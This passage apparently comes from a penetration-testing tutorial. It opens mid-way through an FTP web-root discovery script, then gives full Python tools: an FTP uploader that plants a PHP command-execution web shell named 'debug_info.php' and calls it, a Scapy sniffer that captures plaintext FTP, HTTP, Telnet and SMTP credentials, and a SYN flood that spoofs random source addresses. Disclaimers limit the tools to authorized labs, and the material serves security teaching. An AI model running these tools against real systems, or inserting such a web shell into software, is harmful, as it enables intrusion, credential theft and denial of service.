    parser.add_argument("--target", nargs="+", default=WEBROOT_CANDIDATES,
                        help="Directory keywords to search for")
    parser.add_argument("--depth", type=int, default=5, help="Maximum traversal depth (default: 5)")
    args = parser.parse_args()

    try:
        ftp = ftplib.FTP()
        ftp.connect(args.host, args.port, timeout=10)
        ftp.login(args.user, args.password)
        print(f"[+] FTP connected: {args.host}:{args.port}")
        print(f"[*] Starting recursive traversal (max depth: {args.depth})")
        found = ftp_recursive_list(ftp, "", max_depth=args.depth, target_dirs=args.target)
        ftp.quit()
        print(f"\n[*] Web root candidates: {len(found)}")
        for p in found:
            print(f"  {p}")
    except Exception as exc:
        print(f"[!] Error: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```

### Example 7-4: FTP Web Shell Attack — Web shell upload + execution verification (Python 3.10+)
```python
#!/usr/bin/env python3
"""
FTP Web Shell Upload Tool (Python 3.10+, authorized environments only)
Usage: python3 ftp_shell_upload.py <host> <user> <pass> <remote_dir>
"""
from __future__ import annotations
import argparse
import ftplib
import io
import sys

import requests

WEBSHELL_CONTENT = b'<?php if(isset($_GET["cmd"])){system(htmlspecialchars_decode($_GET["cmd"]));} ?>'
SHELL_NAME = "debug_info.php"


def upload_webshell(
    host: str, port: int, username: str, password: str,
    remote_dir: str, shell_name: str = SHELL_NAME,
) -> bool:
    """Upload web shell via FTP. Returns True on success."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=10)
        ftp.login(username, password)
        ftp.cwd(remote_dir)
        ftp.storbinary(f"STOR {shell_name}", io.BytesIO(WEBSHELL_CONTENT))
        ftp.quit()
        print(f"[+] Web shell uploaded: {remote_dir}/{shell_name}")
        return True
    except Exception as exc:
        print(f"[!] Upload failed: {exc}", file=sys.stderr)
        return False


def verify_and_exec(base_url: str, shell_name: str, command: str = "id") -> str | None:
    """Verify command execution via the uploaded web shell."""
    url = f"{base_url.rstrip('/')}/{shell_name}"
    try:
        r = requests.get(url, params={"cmd": command}, timeout=10)
        if r.status_code == 200 and r.text.strip():
            print(f"[+] Web shell response: {r.text.strip()[:200]}")
            return r.text.strip()
        print(f"[-] No web shell response (HTTP {r.status_code})")
    except requests.RequestException as exc:
        print(f"[!] Request failed: {exc}", file=sys.stderr)
    return None


def main() -> None:
    parser = argparse.ArgumentParser(description="FTP Web Shell Upload Tool (authorized environments only)")
    parser.add_argument("host", help="FTP server address")
    parser.add_argument("user", help="FTP username")
    parser.add_argument("password", help="FTP password")
    parser.add_argument("remote_dir", help="Upload path (e.g. APM_Setup/htdocs)")
    parser.add_argument("--port", type=int, default=21)
    parser.add_argument("--web-url", help="Web access URL (for verification, e.g. http://target.com)")
    parser.add_argument("--shell-name", default=SHELL_NAME)
    args = parser.parse_args()

    ok = upload_webshell(args.host, args.port, args.user, args.password,
                         args.remote_dir, args.shell_name)
    if ok and args.web_url:
        verify_and_exec(args.web_url, args.shell_name)


if __name__ == "__main__":
    main()
```

### Example 7-5: Packet Sniffing — Scapy-based credential detector (Python 3.10+)
```python
#!/usr/bin/env python3
"""
Plaintext Protocol Credential Sniffer (Python 3.10+)
Purpose: Real-time detection of plaintext credentials over HTTP/FTP/Telnet
Dependencies: pip install scapy
Usage: sudo python3 cred_sniffer.py -i eth0
"""
from __future__ import annotations
import argparse
import re
import sys

try:
    from scapy.all import IP, Raw, TCP, sniff
except ImportError:
    print("[!] Missing dependency: pip install scapy", file=sys.stderr)
    sys.exit(1)


# Detection patterns (protocol, pattern, description)
PATTERNS: list[tuple[str, re.Pattern, str]] = [
    ("FTP",    re.compile(rb"(?i)^(USER|PASS) (.+)\r\n"),         "FTP credentials"),
    ("HTTP",   re.compile(rb"(?i)(username|password|passwd|pwd|login)=[^&\s]+"), "HTTP form data"),
    ("Telnet", re.compile(rb"[A-Za-z0-9!@#$%]{3,}"),              "Telnet input"),
    ("SMTP",   re.compile(rb"(?i)^AUTH .+\r\n"),                   "SMTP authentication"),
]

CRED_PORTS = {21, 23, 25, 80, 110, 143, 8080}


def packet_handler(pkt) -> None:
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    src_ip: str = pkt[IP].src
    dst_ip: str = pkt[IP].dst
    dport: int = pkt[TCP].dport
    sport: int = pkt[TCP].sport
    payload: bytes = bytes(pkt[Raw].load)

    if not payload:
        return

    direction = f"{src_ip}:{sport} → {dst_ip}:{dport}"

    for proto, pattern, desc in PATTERNS:
        # Port filter (Telnet on 23, HTTP on 80/8080)
        relevant_port = (
            (proto == "FTP" and dport == 21) or
            (proto == "Telnet" and dport == 23) or
            (proto == "HTTP" and dport in {80, 8080}) or
            (proto == "SMTP" and dport in {25, 587}) or
            dport in CRED_PORTS
        )
        if not relevant_port:
            continue

        m = pattern.search(payload)
        if m:
            found = m.group(0).decode("utf-8", errors="replace").strip()
            print(f"\n[!] {desc} detected")
            print(f"    Direction: {direction}")
            print(f"    Data: {found[:120]}")
            print(f"    Raw: {payload[:200]}")
            break


def main() -> None:
    parser = argparse.ArgumentParser(description="Plaintext Protocol Credential Sniffer (requires root)")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface (default: eth0)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets to capture (0=unlimited)")
    parser.add_argument("-f", "--filter", default="tcp", help="BPF filter (default: tcp)")
    args = parser.parse_args()

    print(f"[*] Sniffing started — Interface: {args.interface}  Filter: {args.filter}")
    print("[*] Press Ctrl+C to stop\n")
    try:
        sniff(
            iface=args.interface,
            filter=args.filter,
            prn=packet_handler,
            count=args.count,
            store=False,
        )
    except KeyboardInterrupt:
        print("\n[*] Sniffing stopped")


if __name__ == "__main__":
    main()
```

### Example 7-6 / 7-7: TCP SYN Flood — Raw socket SYN packet generation (Python 3.10+, educational purpose)
```python
#!/usr/bin/env python3
"""
TCP SYN Flood Demo — Educational/defensive understanding only (Python 3.10+)
DO NOT use for actual attacks. Test only in authorized, isolated environments.
Usage: sudo python3 syn_flood_demo.py <target_ip> <target_port> [--count 10]
"""
from __future__ import annotations
import argparse
import random
import socket
import struct
import sys


def _checksum(data: bytes) -> int:
    """Calculate internet checksum."""
    s = 0
    n = len(data)
    for i in range(0, n - 1, 2):
        s += (data[i] << 8) + data[i + 1]
    if n % 2:
        s += data[-1] << 8
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _build_ip_header(src_ip: str, dst_ip: str) -> bytes:
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0,       # version/IHL, TOS
        40,            # total length (IP + TCP)
        random.randint(0, 0xFFFF),  # ID
        0,             # flags + offset
        64,            # TTL
        socket.IPPROTO_TCP,
        0,             # checksum (kernel fills)
        src, dst,
    )
    return hdr


def _build_tcp_syn(src_port: int, dst_port: int, src_ip: str, dst_ip: str) -> bytes:
    seq = random.randint(0, 0xFFFFFFFF)
    tcp_hdr = struct.pack(
        "!HHLLBBHHH",
        src_port, dst_port,
        seq, 0,
        0x50,   # data offset = 5 words
        0x02,   # SYN flag
        socket.htons(65535),
        0,      # checksum placeholder
        0,
    )
    # Pseudo header for checksum
    pseudo = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
        0,
        socket.IPPROTO_TCP,
        len(tcp_hdr),
    )
    chk = _checksum(pseudo + tcp_hdr)
    return struct.pack(
        "!HHLLBBHHH",
        src_port, dst_port,
        seq, 0,
        0x50, 0x02,
        socket.htons(65535),
        chk,
        0,
    )


def syn_flood(dst_ip: str, dst_port: int, count: int = 10) -> None:
    """SYN Flood demonstration (use only in authorized, isolated environments)."""
    raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    print(f"[*] SYN Flood demo: {dst_ip}:{dst_port} x {count} packets")

    for i in range(count):
        src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        ip_hdr = _build_ip_header(src_ip, dst_ip)
        tcp_hdr = _build_tcp_syn(src_port, dst_port, src_ip, dst_ip)
        raw.sendto(ip_hdr + tcp_hdr, (dst_ip, 0))
        print(f"  [{i+1:>4}] {src_ip}:{src_port} → {dst_ip}:{dst_port}")

    raw.close()
    print("[*] Done")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="TCP SYN Flood Demo (educational purpose, authorized environments only)"
    )
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("--count", type=int, default=10, help="Number of SYN packets to send (default: 10)")
    args = parser.parse_args()

    if args.count > 1000:
        print("[!] Capped at 1000 packets for safety.", file=sys.stderr)
        args.count = 1000

    syn_flood(args.target_ip, args.target_port, args.count)


if __name__ == "__main__":
    main()
```

## 10. Tool Execution Notes

```
WARNING: All tools must only be used in authorized environments!
    - CTF challenges
    - Systems you own
    - Contracted penetration testing targets

Required packages:
pip install scapy paramiko requests dnspython python-whois

Scapy requires root/administrator privileges:
sudo python3 scanner.py 192.168.1.0/24
```
